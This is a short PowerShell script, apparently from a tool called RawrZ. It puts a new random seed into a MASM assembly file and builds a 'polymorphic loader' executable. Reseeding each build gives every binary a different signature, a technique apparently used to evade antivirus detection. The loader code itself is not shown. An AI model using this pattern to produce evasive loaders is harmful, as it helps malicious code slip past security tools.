# RawrZ polymorph_build.ps1 - MASM Polymorphic Loader Builder
# Generates new random seed and builds polymorphic loader

# Generate new random seed
$newSeed = '{0:X8}' -f (Get-Random)
Write-Host "Generating new polymorphic seed: 0x$newSeed" -ForegroundColor Yellow

# Update the assembly file with new seed
$asmContent = Get-Content "polymorph.asm" -Raw
$asmContent = $asmContent -replace 'RANDOM_SEED\s+EQU\s+[0-9A-Fa-f]+h', "RANDOM_SEED     EQU 0x${newSeed}h"
Set-Content "polymorph.asm" $asmContent -Encoding ASCII

# Build the polymorphic loader
Write-Host "Building polymorphic loader..." -ForegroundColor Cyan
try {
    # Assemble with ML64
    & ml64 /c polymorph.asm
    if ($LASTEXITCODE -eq 0) {
        Write-Host "Assembly successful" -ForegroundColor Green
        
        # Link the object file
        & link /subsystem:console /entry:Start polymorph.obj
        if ($LASTEXITCODE -eq 0) {
            Write-Host "Linking successful - polymorph.exe created" -ForegroundColor Green
            Write-Host "New polymorphic binary ready with seed: 0x$newSeed" -ForegroundColor Magenta
        } else {
            Write-Host "Linking failed" -ForegroundColor Red
        }
    } else {
        Write-Host "Assembly failed" -ForegroundColor Red
    }
} catch {
    Write-Host "Build error: $_" -ForegroundColor Red
    Write-Host "Make sure Visual Studio 2022 with MASM is installed" -ForegroundColor Yellow
}
